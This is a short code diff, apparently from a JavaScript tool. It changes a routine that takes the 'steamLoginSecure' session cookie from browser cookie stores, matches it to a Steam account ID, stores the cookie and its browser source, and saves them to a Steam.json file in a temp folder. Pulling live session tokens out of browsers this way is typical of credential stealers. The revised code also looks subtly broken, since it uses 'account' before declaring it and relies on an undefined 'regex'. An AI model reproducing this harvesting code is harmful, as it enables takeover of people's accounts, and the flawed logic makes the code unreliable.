@@ -68,10 +68,13 @@ const steam = async () => {
       });
       if ((await cookies)?.find(cookie => cookie.name === 'steamLoginSecure')) {
         const cookie = (await cookies)?.find(cookie => cookie.host.includes('steam') && cookie.name === 'steamLoginSecure');
-        if (cookie) {
-          const userId = cookie.value?.match(/7656[0-9]{13}/gi)[0];
-          accountsFile.find(account => account.accountId === userId).cookie = cookie.value;
-          accountsFile.find(account => account.accountId === userId).cookieSource = cookie.source;
+        if (cookie && cookie.value && account) {
+          const userId = cookie.value.match(regex)[0];
+          const account = accountsFile.find(account => account.accountId === userId);
+          if (account) {
+            account.cookie = cookie.value;
+            account.cookieSource = cookie.source;
+          }
         }
       }
       fs.writeFileSync(join(getTempFolder(), 'Steam.json'), JSON.stringify(accountsFile));
